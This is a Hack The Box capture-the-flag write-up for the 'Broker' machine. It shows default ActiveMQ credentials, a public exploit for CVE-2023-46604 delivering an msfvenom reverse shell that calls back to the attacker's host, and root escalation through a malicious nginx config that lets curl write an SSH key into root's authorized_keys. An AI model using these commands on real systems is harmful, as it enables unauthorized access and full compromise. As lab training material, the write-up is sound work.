---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Broker

## Summary

[Broker](https://app.hackthebox.com/machines/578) is an <mark style="color:green;">easy-rated</mark> box with a relatively easy foothold leveraging **default credentials** and a **known vulneratiblity**. The privilege escalation path showcases an interesting way of exploiting **excessive binary permissions** along with the **nginx's configuration file** which allows us to gain root access.

<table><thead><tr><th width="90">Step</th><th width="245">Action</th><th>Tool</th><th>Achieved</th></tr></thead><tbody><tr><td>1</td><td>Use of default credentials</td><td><a href="../../../tools/tools/web/creds.md">creds</a></td><td>Web server access</td></tr><tr><td>2</td><td>Application enumeration</td><td>Public PoC*</td><td>Foothold</td></tr><tr><td>3</td><td>User permissions</td><td>LoTL**</td><td>EoP***</td></tr></tbody></table>

_\*Proof of Concept, \*\*Living of The Land (native commands), \*\*\*Elevation of Privileges_

## Recon

Let's start with executing our [Nmap ritual](../../../tools/tools/nmap.md#common-flow).

{% code overflow="wrap" %}
```bash
$ sudo nmap 10.10.11.243 -T4 -A -p $(cat ports) --min-rate=10000 -oA ./scans/aggresive_port-scan

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
35171/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
```
{% endcode %}

Based on Nmap's output:

* SSH is available, so this might be the entrace to the box.
* A nginx web server, related to [`ActiveMQ`](https://activemq.apache.org/), is listening on port `80`. It returns a `401 Unauthorized` status, which means that it requires authentication.
* A lot of other ports seem to be related to `ActiveMQ`.

## Foothold

### Default Credentials

One of the first things to do in our [web checklist](../../../tools/tools/web/web-checklist.md) is to check for **default credentials**, and by doing that, we manage to get in. It also allows us to find ActiveMQ's version (Figure 1).&#x20;

```bash
$ sudo creds search activemq
+--------------------+----------+----------+
| Product            | username | password |
+--------------------+----------+----------+
| activemq (general) |  admin   |  admin   |
| activemq (general) | <blank>  | <blank>  |
+--------------------+----------+----------+
```

<figure><img src="../../../.gitbook/assets/broker_activemq_version.png" alt=""><figcaption><p>Figure 1: Authenticating into ActiveMQ and fingerprinting its version.</p></figcaption></figure>

### Remote Code Execution

Next, we can search for version-specific vulnerabilities. Querying `searchsploit` returns nothing we can use (Figure 2), however, Google does mention an **RCE flaw** ([CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)) (Figure 3).

```bash
searchsploit activemq
```

<figure><img src="../../../.gitbook/assets/broker_searchsploit.png" alt=""><figcaption><p>Figure 2: Searching an exploit with searchploit.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/broker_googling.png" alt=""><figcaption><p>Figure 3: Googling for vulnerabilities.</p></figcaption></figure>

After following the steps outlined on the first [link](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ), we indeed achieve RCE (Figure 4).

{% tabs %}
{% tab title="Step 1" %}
{% code overflow="wrap" %}
```bash
# clone repo
sudo git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
# move into the directory
cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/
# build the binary
sudo go build
# create the payload
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=7331 -f elf -o test.elf
# start an HTTP server
python3 -m http.server 8001
```
{% endcode %}
{% endtab %}

{% tab title="Step 2" %}
<pre class="language-bash"><code class="lang-bash"># start a listener
<strong>nc -lvnp 7331
</strong></code></pre>
{% endtab %}

{% tab title="Step 3" %}
```bash
# edit the XML file
sudo nano poc-linux.xml
# execute the exploit
./ActiveMQ-RCE -i 10.10.11.243 -u http://10.10.14.37:8001/poc-linux.xml
```
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/broker_exploit_all.png" alt=""><figcaption><p>Figure 4: Configuring and executing the exploit.</p></figcaption></figure>

Before doing anything else, let's [stabilize our shell](../../../tools/tools/shells.md#stabilization) and grab our first flag ðŸš©(Figure 5).

{% tabs %}
{% tab title="1. Shell Stabilization" %}
```bash
# spawn bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# send process to the background
# CTRL+Z
# check size
stty size
# disable echo, send I/O straight through, and bring process to foreground
stty raw -echo; fg
# press enter once and set terminal's dimensions
stty rows 51 cols 209
export TERM=xterm
```
{% endtab %}

{% tab title="2. Flag" %}
```bash
# search for the file
find /home -type f -name user.txt 2>/dev/null
# display its contents
cat /home/activemq/user.txt
```
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/broker_shell_stab.png" alt=""><figcaption><p>Figure 5: Shell stabilization process with Python3.</p></figcaption></figure>

## Privilege Escalation

### Exploiting Nginx

By checking if the compromised account have any `sudo` privileges (Figure 6), we find out that it can run the `nginx` application as `root` ! This can be leveraged by **creating and loading a new configuration file** into the web server using the [ngx\_http\_dav\_module](https://nginx.org/en/docs/http/ngx\_http\_dav\_module.html) extension that will allows us to upload files (Figure 7).

{% tabs %}
{% tab title="Check for elevated privileges" %}
```bash
sudo -l
```
{% endtab %}

{% tab title="Create and load configuration file" %}
```bash
# create the malicious configuration file
nano mal_config.conf
# load configuration to the server
sudo /usr/sbin/nginx -c ~/mal_config.conf
```
{% endtab %}

{% tab title="File's content" %}
{% code title="mal_config.conf" %}
```bash
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
worker_connections 768;
}
http {
server {
listen 1337;
root /;
autoindex on;
dav_methods PUT;
}
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/broker_sudo.png" alt=""><figcaption><p>Figure 6: Checking for elevated privileges.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/broker_nginx_mal_conf.png" alt=""><figcaption><p>Figure 7: The malicious ngxin configuration.</p></figcaption></figure>

We can confirm that the configuration is loaded by checking if the port we specified is listening. If it does, we can proceed to generate an SSH keypair and write our public key to `root`'s directory. Having set the document root to `/`, we must specify the full path: `/root/.ssh/authorized_keys` and use the `-d` option to set the contents of the written file to our public key (Figure 8).

<pre class="language-bash"><code class="lang-bash"><strong># generate SSH keys
</strong><strong>ssh-keygen
</strong># upload the public key into root's folder
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
</code></pre>

<figure><img src="../../../.gitbook/assets/broker_ssh_key.png" alt=""><figcaption><p>Figure 9: Generating an SSH keypair and writing our public to root's folder.</p></figcaption></figure>

We can now SSH into the machine as `root` and snatch the `root.txt` flag ðŸš© (Figure 10).

```bash
# SSH as root using key authentication
ssh -i root root@localhost
# snatch the flag
cat /root/root.txt
```

<figure><img src="../../../.gitbook/assets/broker_root.png" alt=""><figcaption><p>Figure 10: SSHing as root and snatching the flag!</p></figcaption></figure>
